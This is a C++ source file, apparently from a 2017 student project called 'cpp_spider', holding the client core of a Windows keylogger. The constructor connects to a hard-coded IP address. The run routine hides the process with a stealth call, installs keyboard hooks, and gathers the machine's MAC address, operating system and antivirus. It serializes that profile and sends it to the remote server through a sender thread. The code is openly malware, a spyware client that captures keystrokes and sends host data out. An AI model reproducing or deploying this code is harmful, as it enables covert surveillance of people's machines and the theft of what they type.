/*
** ClientCore.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientCore.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:59:44 2017 Maxime PILLON
** Last update Thu Oct 05 10:59:44 2017 Maxime PILLON
*/

#include "Protocol/BufferSender.hpp"
#include "Protocol/ClientProtocol.hpp"
#include "KeyLogger/WindowsKeyLogger.hpp"
#include "ClientCore.hpp"
#include "Thread/BoostThread.hpp"

spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol("10.26.112.233", PORT)),
				   _keylogger(new spider::WindowsKeyLogger())
{}

spider::ClientCore::~ClientCore()
{}

void spider::ClientCore::run()
{
  MSG msg;
  bool running;
  spider::IThread	thread;

  running = true;
  _keylogger->stealth();
  _keylogger->initHooks();
  _keylogger->getMacAddr();
  _keylogger->getOperatingSystem();
  _keylogger->getAntiVirus();
  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
  thread.createThread(_proto);
  while (running)
  {
    if (!GetMessage(&msg, nullptr, 0, 0))
    {
      running = false;
    }
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
}